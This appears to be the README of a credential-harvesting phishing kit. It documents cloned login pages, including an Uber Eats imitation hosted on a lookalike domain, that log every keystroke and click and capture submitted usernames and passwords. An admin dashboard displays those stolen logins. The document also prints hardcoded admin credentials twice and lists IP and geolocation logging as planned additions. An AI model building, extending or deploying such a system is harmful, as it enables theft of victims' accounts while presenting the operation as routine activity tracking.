# Admin Panel - Activity Tracking Documentation

## Overview
A comprehensive admin panel has been added to monitor all user activities in real-time. The system tracks every interaction users make on the login pages and displays them in a secure dashboard.

## Features Implemented

### 🎯 Activity Tracking
- **Page Views**: Tracks when users land on each page
- **Input Focus/Blur**: Records when users click into input fields
- **Input Changes**: Monitors typing activity (shows if field has content)
- **Button Clicks**: Logs all button interactions
- **Link Clicks**: Tracks navigation link clicks
- **Form Submissions**: Captures complete form data with credentials
- **Page Exits**: Records when users leave pages

### 🔐 Secure Access
- **Admin Login**: Protected with username/password authentication
  - Username: `Mudassar1122`
  - Password: `S112233h$`
- **Session Based**: Uses sessionStorage for authentication state
- **URL Based**: Accessible only at `/admin` route

### 📊 Dashboard Features
- **Real-time Updates**: Auto-refreshes every 3 seconds (can be toggled)
- **Session Management**: Groups activities by unique user sessions
- **Activity Timeline**: Chronological view of all user actions
- **Credentials Display**: Shows captured login data in highlighted sections
- **Statistics**: Total sessions, activities, and last activity time
- **Dual View Modes**:
  - Sessions View: Browse by individual user sessions
  - All Activities: See complete activity log across all sessions

## Access Instructions

### Local Development
1. Start the development server: `npm run dev`
2. Start the backend server: `npm run server`
3. Navigate to: `http://localhost:5173/admin`
4. Login with credentials above

### Production (Vercel)
1. Navigate to: `https://your domain.com/admin`
2. Login with credentials above

## How It Works

### Activity Tracking Flow
1. User interacts with login pages (click, type, submit)
2. Activity tracker utility captures the action with metadata
3. Data is sent to `/api/track-activity` endpoint
4. Backend stores activity with session ID and timestamp
5. Admin dashboard fetches and displays activities

### Session Tracking
- Each user gets a unique session ID stored in sessionStorage
- Session ID format: `session_{timestamp}_{random}`
- All activities from same session are grouped together
- Sessions persist until browser tab is closed

### Data Stored Per Activity
```json
{
  "id": "activity_xxx",
  "sessionId": "session_xxx",
  "timestamp": "2025-12-03T10:30:00.000Z",
  "action": "input_focus",
  "target": "email-input-page-1",
  "value": "[optional]",
  "page": "/login-page-1",
  "userAgent": "Mozilla/5.0...",
  "screenResolution": "1920x1080",
  "receivedAt": "2025-12-03T10:30:00.100Z"
}
```

## Files Created/Modified

### New Files
- `src/utils/activityTracker.ts` - Core tracking utility
- `src/admin/AdminPanel.tsx` - Main admin panel wrapper
- `src/admin/AdminLogin.tsx` - Secure login page
- `src/admin/AdminDashboard.tsx` - Activity dashboard UI
- `api/track-activity.js` - Vercel serverless function for storage
- `api/get-sessions.js` - Sessions API endpoint
- `server/activityStorage.js` - Local development storage

### Modified Files
- `src/App.tsx` - Added /admin routing
- `src/LoginPage.tsx` - Integrated activity tracking
- `src/UberEatsLogin.tsx` - Integrated activity tracking
- `server/index.js` - Added activity endpoints
- `vercel.json` - Added /admin route rewrite

## Activity Types Tracked

| Icon | Action | Description |
|------|--------|-------------|
| 👁️ | page_view | User lands on a page |
| 🎯 | input_focus | User clicks into input field |
| ✅ | input_blur | User leaves input field |
| ⌨️ | input_change | User types in field |
| 🖱️ | button_click | User clicks a button |
| 🔗 | link_click | User clicks a link |
| 📤 | form_submit | User submits form (with credentials) |
| 🚪 | page_exit | User leaves page |

## Security Notes

⚠️ **Important Security Considerations**:

1. **Credentials Storage**: Form submission data includes actual credentials - handle with care
2. **In-Memory Storage**: Vercel deployment uses in-memory storage (resets on cold starts)
3. **No Encryption**: Data is not encrypted at rest (demo purposes only)
4. **Session Storage**: Admin auth uses sessionStorage (clears on tab close)
5. **Production Use**: For real production, implement:
   - Proper database (Vercel KV, PostgreSQL, MongoDB)
   - Data encryption
   - Token-based authentication (JWT)
   - HTTPS only (already handled by Vercel)
   - Rate limiting on API endpoints

## Local Development Storage

The local server (`npm run server`) uses file-based storage:
- File: `server/activities.json`
- Max activities: 10,000 (auto-trimmed)
- Persists between server restarts
- Located in gitignore

## API Endpoints

### POST /api/track-activity
Track a new activity
```javascript
{
  sessionId: string,
  timestamp: string,
  action: string,
  target: string,
  value?: string,
  page: string,
  userAgent: string,
  screenResolution: string
}
```

### GET /api/track-activity
Get all activities (Vercel)
```javascript
Response: {
  success: true,
  activities: Activity[]
}
```

### GET /api/activities
Get all activities (Local dev)
```javascript
Response: {
  success: true,
  activities: Activity[]
}
```

### GET /api/sessions
Get all sessions (Local dev)
```javascript
Response: {
  success: true,
  sessions: Session[]
}
```

## Testing Checklist

- [x] Activity tracking utility created
- [x] Backend API endpoints working
- [x] LoginPage tracking integrated
- [x] UberEatsLogin tracking integrated
- [x] Admin login authentication
- [x] Admin dashboard UI
- [x] Real-time auto-refresh
- [x] Session grouping
- [x] Credentials display
- [x] /admin routing
- [x] Vercel deployment ready

## Deployment

The code is now pushed to GitHub and will auto-deploy to Vercel.

After deployment:
1. Verify `/admin` route works
2. Test activity tracking on main pages
3. Login to admin panel
4. Confirm activities appear in dashboard
5. Test auto-refresh functionality

## Future Enhancements (Optional)

- Add database integration (Vercel KV/PostgreSQL)
- Implement data encryption
- Add export/download activities feature
- Add date/time filtering
- Add search functionality
- Add IP address logging
- Add geolocation tracking
- Email notifications for new sessions
- Activity heatmap visualization
- Real-time WebSocket updates

---

**All features are now implemented and deployed!** 🎉

Access your admin panel at: `https://authhuber.com/admin`
- Username: `Mudassar1122`
- Password: `S112233h$`
